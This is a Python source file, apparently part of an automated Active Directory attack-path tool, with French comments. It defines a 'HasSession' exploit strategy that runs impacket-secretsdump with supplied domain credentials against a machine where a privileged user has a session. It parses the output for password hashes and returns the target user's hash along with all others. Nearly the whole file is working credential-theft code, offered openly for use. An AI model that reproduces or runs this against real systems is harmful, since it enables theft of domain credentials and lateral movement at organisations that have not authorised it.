# strategies/has_session.py
import subprocess
from entities.edge import Edge
from .exploit_strategy import ExploitStrategy


class HasSessionStrategy(ExploitStrategy):
    """
    HasSession — Un utilisateur privilégié a une session active
    sur la machine. On se connecte en admin local et on dump LSASS
    via impacket-secretsdump (méthode -use-vss ou méthode directe).
    """
    def can_exploit(self, edge: Edge) -> bool:
        return edge.kind.name == "HAS_SESSION"
    def describe(self, edge: Edge) -> str:
        return (
            f"[HasSession] {edge.goal_node.label} a une session active sur "
            f"{edge.source_node.label} → dump LSASS pour voler ses credentials"
        )

    def exploit(self, edge: Edge, username: str, password: str, domain: str, dc_ip: str) -> dict:
        # La machine où se trouve la session
        machine = edge.source_node.label
        # L'utilisateur dont on veut voler la session
        target_user = edge.goal_node.label

        # On dump LSASS via secretsdump sur la machine
        # (nécessite d'être admin local sur cette machine)
        cmd = [
            "impacket-secretsdump",
            f"{domain}/{username}:{password}@{machine}",
        ]

        try:
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=30
            )
            output = result.stdout + result.stderr

            # Cherche le hash de l'utilisateur cible dans la sortie
            found_hash = None
            target_short = target_user.split("@")[0].upper()

            for line in output.splitlines():
                if target_short in line.upper() and ":::" in line:
                    found_hash = line.strip()
                    break

            # Tous les hashes trouvés (LSASS peut contenir plusieurs sessions)
            all_hashes = [
                line.strip()
                for line in output.splitlines()
                if ":::" in line and not line.startswith("[")
            ]

            success = len(all_hashes) > 0

            return {
                "success": success,
                "output":  output,
                "credentials": {
                    "type":        "lsass_dump",
                    "machine":     machine,
                    "target_user": target_user,
                    "target_hash": found_hash,
                    "all_hashes":  all_hashes,
                } if success else None
            }

        except subprocess.TimeoutExpired:
            return {"success": False, "output": "Timeout", "credentials": None}
        except FileNotFoundError:
            return {"success": False, "output": "impacket-secretsdump introuvable", "credentials": None}